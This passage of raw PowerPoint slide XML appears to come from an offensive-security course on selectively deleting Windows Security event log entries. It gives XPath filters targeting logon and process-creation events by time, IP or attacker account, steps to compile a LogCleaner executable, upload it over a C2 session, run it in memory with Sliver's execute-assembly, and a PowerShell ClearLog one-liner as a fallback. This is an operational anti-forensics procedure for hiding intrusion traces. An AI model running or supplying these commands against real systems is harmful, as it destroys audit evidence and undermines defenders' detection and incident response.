                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>EventID</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>=4624) and </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>TimeCreated</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>[@SystemTime&gt;='2026-08-20T14:30:00.000Z' and @SystemTime&lt;'2026-08-20T14:35:00.000Z']]]</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="1700" dirty="0">
              <a:solidFill>
                <a:schemeClr val="bg1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="25849812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40E760-CECA-A9FD-1320-8EC5442F6DEF}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="0"/>
            <a:ext cx="12192000" cy="6858000"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="92500"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2800" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Example – Delete only events from a specific source IP address:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2800" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>*[System[</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>EventData</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>/Data[@Name='IpAddress']='192.168.1.100']]</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2800" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Example – Delete only events tied to a specific user account:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2800" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>*[System[</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>EventData</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>/Data[@Name='TargetUserName']='ATTACKER_USER’]]</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Example – Delete multiple Event IDs (4624 and 4688) from a specific time range:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="120000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>*[System[(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>EventID</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>=4624 or </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>EventID</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>=4688) and </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>TimeCreated</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>[@SystemTime&gt;='2026-08-20T14:30:00.000Z' and @SystemTime&lt;'2026-08-20T14:35:00.000Z']]]</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="2800" dirty="0">
              <a:solidFill>
                <a:schemeClr val="bg1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Step 3: Export Events That Match Your XPath Query (For Verification)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Before deleting, export the events that match your query to a separate file. This lets you verify you are targeting the correct events.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="120000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>execute -o </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>powershell</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t> -c "</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>wevtutil</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>epl</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t> Security C:\temp\target_events.evtx /q:"*[System[(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>EventID</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>=4624) and </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>TimeCreated</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>[@SystemTime&gt;='2026-08-20T14:30:00.000Z' and @SystemTime&lt;'2026-08-20T14:35:00.000Z']]]""</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="22208757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40E760-CECA-A9FD-1320-8EC5442F6DEF}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="0"/>
            <a:ext cx="12192000" cy="6858000"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Step 4: Create the C# .NET Code for Selective Deletion</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>On your Kali machine, create a file named </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>LogCleaner.cs</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t> with the following code:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:hlinkClick r:id="rId2">
                  <a:extLst>
                    <a:ext uri="{A12FA001-AC4F-418D-AE19-62706E023703}">
                      <ahyp:hlinkClr xmlns:ahyp="http://schemas.microsoft.com/office/drawing/2018/hyperlinkcolor" val="tx"/>
                    </a:ext>
                  </a:extLst>
                </a:hlinkClick>
              </a:rPr>
              <a:t>https://github.com/umarniazafrid/Week-11-Task-1-Part-2-Selective-deletion/tree/main</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Step 5: Compile the C# Code</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Compile </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>LogCleaner.cs</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t> into an executable using Visual Studio or the C# compiler:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>csc /</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>target:exe</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t> /</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>out:LogCleaner.exe</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>LogCleaner.cs</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:solidFill>
                <a:schemeClr val="bg1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:solidFill>
                <a:schemeClr val="bg1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Step 6: Upload the Compiled Executable to the Target</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Through your C2 session, upload LogCleaner.exe to the target machine:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>upload /path/to/LogCleaner.exe C:\temp\</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:solidFill>
                <a:schemeClr val="bg1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="33263784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40E760-CECA-A9FD-1320-8EC5442F6DEF}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="0"/>
            <a:ext cx="12192000" cy="6858000"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="70000" lnSpcReduction="20000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:solidFill>
                <a:schemeClr val="bg1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Step 7: Execute the Cleaner Using execute-assembly (Sliver)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>In Sliver, run the compiled .NET assembly directly in memory:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>execute-assembly C:\temp\LogCleaner.exe</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>The code calls </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>EvtClearLog</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t> with your XPath query. Only events matching your criteria are deleted. Everything else remains.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:solidFill>
                <a:schemeClr val="bg1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Step 8: Alternative – Execute with PowerShell (If execute-assembly is not available)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>If your C2 does not support execute-assembly, you can run the deletion via PowerShell using the </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>System.Diagnostics.Eventing.Reader</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t> namespace:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="120000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>execute -o </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>powershell</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t> -c "$query = '*[System[(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>EventID</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>=4624) and </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>TimeCreated</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>[@SystemTime&gt;=''2026-08-20T14:30:00.000Z'' and @SystemTime&lt;''2026-08-20T14:35:00.000Z'']]]'; $</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>el</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t> = New-Object </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>System.Diagnostics.Eventing.Reader.EventLogSession</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>; $</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>el.ClearLog</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>('Security', $query) ''</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="120000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:solidFill>
                <a:schemeClr val="bg1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Step 9: Verify Selective Deletion</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Check that only your target events are gone:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>execute -o </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>powershell</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t> -c "Get-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>WinEvent</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t> -</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>FilterHashtable</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t> @{LogName='Security'; ID=4624} -</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>MaxEvents</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t> 10"</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Your specific events from the targeted time range should be missing. Other events (from legitimate activity) should still appear.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="120000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:solidFill>
                <a:schemeClr val="bg1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:solidFill>
                <a:schemeClr val="bg1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:solidFill>
                <a:schemeClr val="bg1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="8155716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40E760-CECA-A9FD-1320-8EC5442F6DEF}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="0"/>
            <a:ext cx="12192000" cy="6858000"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="70000" lnSpcReduction="20000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="3100" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Step 10: Verify Events Before and After (Proof)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="3100" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Before deletion:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="3100" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>execute -o </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3100" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>powershell</a:t>
            </a:r>
            <a:r>
